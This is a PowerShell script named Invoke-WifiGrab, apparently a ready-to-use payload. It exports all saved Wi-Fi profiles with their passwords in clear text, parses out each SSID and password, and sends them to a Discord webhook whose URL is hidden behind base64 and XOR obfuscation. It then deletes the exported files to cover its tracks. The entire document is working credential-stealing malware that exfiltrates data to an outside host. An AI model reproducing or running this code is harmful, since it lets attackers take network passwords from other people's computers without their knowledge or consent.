function xorEncryptDecrypt {
    param (
        [string]$key
    )
    $webhookUrl = "DgEXGwpVWk0NHRALCQcHRRoAGE0IBApHERABAxYAHhFGRVBaXkJVW0lWQVNeRFtYXkZVWlYhIAoeGhshDUQ3XCkBQDcqGVYQHzcARjEuFFNeBlUsCUUwUxoVMDYbHAEFKD4bMSsdAwBdHxZfMkM0PDwuESNEEgwZIw=="
    $decodedWebhookUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($webhookUrl))
    $result = ""
    for ($i = 0; $i -lt $decodedWebhookUrl.Length; $i++) {
        # XOR each character with the key character, wrapping around if needed
        $char = [char]([byte][char]$decodedWebhookUrl[$i] -bxor [byte][char]$key[$i % $key.Length])
        $result += $char
    }
    return $result
}

function Invoke-WifiGrab {
    param (
        [string]$Key
    )
    # Navigate to the temporary folder
    cd $env:temp

    # Export all Wi-Fi profiles with keys (passwords) visible
    netsh wlan export profile key=clear | Out-Null

    # Search for keyMaterial lines in the exported XML files
    Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS

    # Define the webhook URL
    $webhookUrl = xorEncryptDecrypt -key $Key

    # Read the extracted key materials from the file
    $keyMaterialContent = Get-Content -Path "Wi-Fi-PASS" -Raw

    # Initialize an array to store formatted Wi-Fi details
    $formattedWiFiList = @()

    # Extract SSID and Passwords between <keyMaterial> tags using regex
    $regex = '<keyMaterial>(.*?)<\/keyMaterial>'
    $matches = [regex]::Matches($keyMaterialContent, $regex)

    # Extract SSIDs from the XML filenames and match with the passwords
    $xmlFiles = Get-ChildItem -Filter 'Wi*.xml'

    foreach ($xmlFile in $xmlFiles) {
        # Extract SSID from the XML filename (before ".xml")
        $ssid = [System.IO.Path]::GetFileNameWithoutExtension($xmlFile.Name) -replace 'Wi-Fi-', ''

        # Find corresponding password match
        $passwordMatch = [regex]::Match((Get-Content $xmlFile.FullName -Raw), $regex)
        if ($passwordMatch.Success) {
            $password = $passwordMatch.Groups[1].Value

            # Append to the list for sending to Discord
            $formattedWiFiList += "-----------------------"
            $formattedWiFiList += "SSID: $ssid"
            $formattedWiFiList += "Password: $password"
        }
    }

    # Convert the list to a string for the Discord message
    $formattedWiFiString = $formattedWiFiList -join "`n"

    # Generate random RGB color and convert it to decimal
    $randomColor = Get-Random -Minimum 0x000000 -Maximum 0xFFFFFF

    # Prepare JSON payload
    $jsonData = @{
        content = $null
        embeds = @(
            @{
                title = "Wi-fi List:"
                description = $formattedWiFiString
                color = $randomColor
            }
        )
        attachments = @()
    } | ConvertTo-Json

    Write-Output $decodedString

    # Send data to Discord webhook
    Invoke-WebRequest -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonData | Out-Null

    # Optionally clean up the exported files
    Remove-Item Wi-*
}
